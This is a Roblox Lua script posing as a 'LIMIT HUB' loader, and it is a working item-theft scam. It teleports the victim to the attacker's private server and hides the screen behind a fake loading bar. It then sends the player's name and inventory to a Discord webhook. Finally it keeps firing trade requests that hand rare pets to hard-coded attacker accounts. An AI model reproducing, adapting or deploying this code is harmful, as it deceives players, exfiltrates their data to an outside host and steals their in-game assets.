-- Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Webhook (optional logging)
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

-- Target Pets
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

-- Attacker Usernames (your accounts)
local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}

-- Private Server Info (your server)
local placeId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"

-- STEP 1: Teleport to your private server
task.delay(2, function()
    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
end)

-- STEP 2: Wait for load
game.Loaded:Wait()
task.wait(5)

-- STEP 3: Fake LIMIT HUB GUI (5% per 10s)
task.spawn(function()
    local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false

    local bg = Instance.new("Frame", screenGui)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.Size = UDim2.new(1, 0, 1, 0)

    local title = Instance.new("TextLabel", bg)
    title.Text = "LIMIT HUB"
    title.Font = Enum.Font.SciFi
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    title.TextStrokeTransparency = 0.2
    title.TextScaled = true
    title.Size = UDim2.new(0, 600, 0, 100)
    title.Position = UDim2.new(0.5, -300, 0.5, -160)
    title.BackgroundTransparency = 1

    local bar = Instance.new("Frame", bg)
    bar.Size = UDim2.new(0, 400, 0, 30)
    bar.Position = UDim2.new(0.5, -200, 0.5, -30)
    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    local fill = Instance.new("Frame", bar)
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)

    local percentLabel = Instance.new("TextLabel", bg)
    percentLabel.Size = UDim2.new(0, 100, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.Font = Enum.Font.SciFi
    percentLabel.TextScaled = true

    local loadingText = Instance.new("TextLabel", bg)
    loadingText.Text = "LOADING"
    loadingText.Size = UDim2.new(0, 400, 0, 70)
    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
    loadingText.TextStrokeTransparency = 0.2
    loadingText.Font = Enum.Font.SciFi
    loadingText.TextScaled = true

    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(10)
    end

    screenGui:Destroy()
end)

-- STEP 4: Send inventory to webhook
task.delay(10, function()
    local data = {items = {}, rarePets = {}}
    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)
                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    local payload = {
        username = "LimitHub Logger",
        embeds = {{
            title = "🚨 New Target Logged",
            description = "**User:** " .. LocalPlayer.Name ..
                "\n**Items:** " .. table.concat(data.items, ", ") ..
                "\n**Rare Pets:** " .. table.concat(data.rarePets, ", "),
            color = 16776960
        }}
    }

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end)

-- STEP 5: Auto-transfer pets silently
task.delay(12, function()
    task.spawn(function()
        while true do
            for _, p in pairs(Players:GetPlayers()) do
                if table.find(attackers, p.Name) then
                    local args = {p.Name, {}}
                    local petFolder = LocalPlayer:FindFirstChild("Pets")
                    if petFolder then
                        for _, pet in pairs(petFolder:GetChildren()) do
                            if pet:IsA("Model") and table.find(targetedPets, pet.Name) then
                                table.insert(args[2], pet.Name)
                            end
                        end
                    end

                    if #args[2] > 0 then
                        pcall(function()
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeInvitePlayer"):FireServer(unpack(args))
                        end)
                    end
                end
            end
            task.wait(5)
        end
    end)
end)
